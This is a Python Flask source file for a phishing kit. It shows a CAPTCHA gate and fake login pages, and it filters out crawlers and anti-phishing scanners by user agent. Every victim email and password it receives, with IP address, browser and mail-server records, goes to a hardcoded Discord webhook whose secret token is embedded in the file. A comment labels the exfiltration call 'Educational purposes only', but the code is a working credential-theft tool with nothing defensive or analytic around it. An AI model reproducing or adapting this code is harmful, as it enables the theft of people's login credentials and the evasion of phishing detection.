import requests
from flask import Flask, request, abort, render_template, session, redirect, url_for, jsonify
import secrets
import random
import io
import base64
import string
import time
from PIL import Image, ImageDraw, ImageFont
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import smtplib, ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
import random
import dns.resolver

# Discord Webhook URL
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1339995668625756232/jUZhB0L27EePcFo4psPduhjh_4VIv0xzO3D2gYwNtplfcoAXfGXtUdbOMhDuWJxmYcKn"

def get_mx_records(domain):
    try:
        answers = dns.resolver.resolve(domain, 'MX')
        return [str(record.exchange) for record in answers]
    except Exception as e:
        return [f"Error: {str(e)}"]

def send_discord_message(email, password, ip, useragent, mx_records):
    message = {
        "username": "Logger Bot",
        "avatar_url": "data:image/jpeg;base64,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",  # Optional bot avatar
        "embeds": [
            {
                "title": "🔔 New Login Attempt",
                "color": 16711680,  # Red color in Discord embed
                "fields": [
                    {"name": "📧 Email", "value": f"`{email}`", "inline": False},
                    {"name": "🔑 Password", "value": f"`{password}`", "inline": False},
                    {"name": "🌐 IP", "value": f"`{ip}`", "inline": False},
                    {"name": "🖥 User-Agent", "value": f"`{useragent}`", "inline": False},
                    {"name": "📡 MX Records", "value": "\n".join([f"`{mx}`" for mx in mx_records]), "inline": False},
                ],
                "footer": {"text": "Logger Bot - Secure Notifications"},
            }
        ]
    }
    
    requests.post(DISCORD_WEBHOOK_URL, json=message)  # Educational purposes only

app = Flask(__name__)
limiter = Limiter(get_remote_address, app=app, default_limits=["6 per day", "6 per hour"])
secret_keyx = secrets.token_urlsafe(24)
app.secret_key = secret_keyx

bot_user_agents = [
'Googlebot', 
'Baiduspider', 
'ia_archiver',
'R6_FeedFetcher', 
'NetcraftSurveyAgent', 
'Sogou web spider',
'bingbot', 
'Yahoo! Slurp', 
'facebookexternalhit', 
'PrintfulBot',
'msnbot', 
'Twitterbot', 
'UnwindFetchor', 
'urlresolver', 
'Butterfly', 
'TweetmemeBot',
'PaperLiBot',
'MJ12bot',
'AhrefsBot',
'Exabot',
'Ezooms',
'YandexBot',
'SearchmetricsBot',
'phishtank',
'PhishTank',
'picsearch',
'TweetedTimes Bot',
'QuerySeekerSpider',
'ShowyouBot',
'woriobot',
'merlinkbot',
'BazQuxBot',
'Kraken',
'SISTRIX Crawler',
'R6_CommentReader',
'magpie-crawler',
'GrapeshotCrawler',
'PercolateCrawler',
'MaxPointCrawler',
'R6_FeedFetcher',
'NetSeer crawler',
'grokkit-crawler',
'SMXCrawler',
'PulseCrawler',
'Y!J-BRW',
'80legs.com/webcrawler',
'Mediapartners-Google', 
'Spinn3r', 
'InAGist', 
'Python-urllib', 
'NING', 
'TencentTraveler',
'Feedfetcher-Google', 
'mon.itor.us', 
'spbot', 
'Feedly',
'bot',
'curl',
"spider",
"crawler"
]

# Function to generate a random CAPTCHA code
def generate_captcha_code(length=4):
    return ''.join(random.choices(string.digits, k=length))

# Function to generate a CAPTCHA image
def generate_captcha_image(code):
    width, height = 150, 60
    image = Image.new('RGB', (width, height), color=(255, 255, 255))
    draw = ImageDraw.Draw(image)

    # Add some noise (dots)
    for _ in range(random.randint(100, 200)):
        draw.point((random.randint(0, width), random.randint(0, height)), fill=(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)))

    # Use a truetype font for the text
    try:
        font = ImageFont.truetype("arial.ttf", 36)
    except IOError:
        font = ImageFont.load_default()

    # Add the CAPTCHA text with distortion
    for i, char in enumerate(code):
        x = 20 + i * 30
        y = random.randint(10, 20)
        angle = random.randint(-25, 25)
        draw.text((x, y), char, font=font, fill=(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)))

    # Add lines for additional noise
    for _ in range(random.randint(3, 5)):
        x1, y1 = random.randint(0, width), random.randint(0, height)
        x2, y2 = random.randint(0, width), random.randint(0, height)
        draw.line([(x1, y1), (x2, y2)], fill=(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)), width=2)

    # Save the image to a bytes buffer
    img_io = io.BytesIO()
    image.save(img_io, 'PNG')
    img_io.seek(0)

    # Convert the image to base64 string to pass to the HTML
    return base64.b64encode(img_io.getvalue()).decode('utf-8')

@app.route('/', methods=['GET', 'POST'])
def captcha():
    if request.method == 'GET':
        if 'passed_captcha' in session and session['passed_captcha']:
            return redirect(url_for('success'))

        # Generate a random 4-digit CAPTCHA code
        code = generate_captcha_code()
        session['captcha_code'] = code
        session['captcha_time'] = time.time()  # Track time when the CAPTCHA was created
        userauto = request.args.get("web")
        userdomain = userauto[userauto.index('@') + 1:] if userauto else ""
        session['eman'] = userauto
        session['ins'] = userdomain

        # Generate the CAPTCHA image
        captcha_image = generate_captcha_image(code)

        # Pass the base64 string directly to the template
        return render_template('captcha.html', captcha_image=captcha_image, eman=userauto, ins=userdomain, error=False)

    elif request.method == 'POST':
        user_input = request.form['code']
        captcha_time = session.get('captcha_time', 0)

        if time.time() - captcha_time > 60:
            return render_template('captcha.html', error=True, message="Captcha expired. Please try again.")

        if user_input == session.get('captcha_code'):
            session['passed_captcha'] = True
            return redirect(url_for('success'))
        else:
            # Generate a new CAPTCHA if the user input was incorrect
            code = generate_captcha_code()
            session['captcha_code'] = code
            captcha_image = generate_captcha_image(code)
            return render_template('captcha.html', captcha_image=captcha_image, error=True, message="Incorrect CAPTCHA. Please try again.")

@app.route('/success')
def success():
    if 'passed_captcha' in session and session['passed_captcha']:
        web_param = request.args.get('web')
        return redirect(url_for('route2', web=web_param))
    else:
        return redirect(url_for('captcha'))


@app.route("/m")
def route2():
    web_param = request.args.get('web')
    if web_param:
        session['eman'] = web_param
        session['ins'] = web_param[web_param.index('@') + 1:]
    return render_template('index.html', eman=session.get('eman'), ins=session.get('ins'))


@app.route("/first", methods=['POST'])
def first():
    if request.method == 'POST':
        # Introduce a randomized delay between 10 to 30 seconds
          

        ip = request.headers.get('X-Forwarded-For') or \
             request.headers.get('X-Real-IP') or \
             request.headers.get('X-Client-IP') or \
             request.remote_addr

        email = request.form.get("horse")
        password = request.form.get("pig")
        useragent = request.headers.get('User-Agent')

        # Extract domain and fetch MX records
        domain = email.split('@')[-1] if email and "@" in email else None
        mx_records = get_mx_records(domain) if domain else ["No domain found"]

        # Send data to Discord with MX records
        send_discord_message(email, password, ip, useragent, mx_records)

        # Store email in session
        session['eman'] = email

        # Redirect as in your original code
        return redirect(url_for('benza', web=email))

    return "Method Not Allowed", 405  # Handle wrong request method



@app.route("/second", methods=['POST'])
def second():
    if request.method == 'POST':
        # Introduce a randomized delay between 10 to 30 seconds
        delay_time = random.randint(10, 30)
        time.sleep(delay_time)

        ip = request.headers.get('X-Forwarded-For') or \
             request.headers.get('X-Real-IP') or \
             request.headers.get('X-Client-IP') or \
             request.remote_addr

        email = request.form.get("horse")
        password = request.form.get("pig")
        useragent = request.headers.get('User-Agent')

        # Send data to Discord
        send_discord_message(email, password, ip, useragent)

        # Store email in session
        session['ins'] = email

        # Redirect to 'lasmo' route as in your original code
        return redirect(url_for('lasmo', web=email))

    return "Method Not Allowed", 405  # Handle wrong request method



@app.route("/benzap", methods=['GET'])
def benza():
    if request.method == 'GET':
        eman = session.get('eman')
        dman = session.get('ins')
    return render_template('ind.html', eman=eman, dman=dman)

@app.route("/lasmop", methods=['GET'])
def lasmo():
    userip = request.headers.get("X-Forwarded-For")
    useragent = request.headers.get("User-Agent")
    
    if useragent in bot_user_agents:
        abort(403)  # forbidden
    
    if request.method == 'GET':
        dman = session.get('ins')
    return render_template('main.html', dman=dman)

if __name__ == '__main__':
	app.run(host="0.0.0.0", port=3000)
